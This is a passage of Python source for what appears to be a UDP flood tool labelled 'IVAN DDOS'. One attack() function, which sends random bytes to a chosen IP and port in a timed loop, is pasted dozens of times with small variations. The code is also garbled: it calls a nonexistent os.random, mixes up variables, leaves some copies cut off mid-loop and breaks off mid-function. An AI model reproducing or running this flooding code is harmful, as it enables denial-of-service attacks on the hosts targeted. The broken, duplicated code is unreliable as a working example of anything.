    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
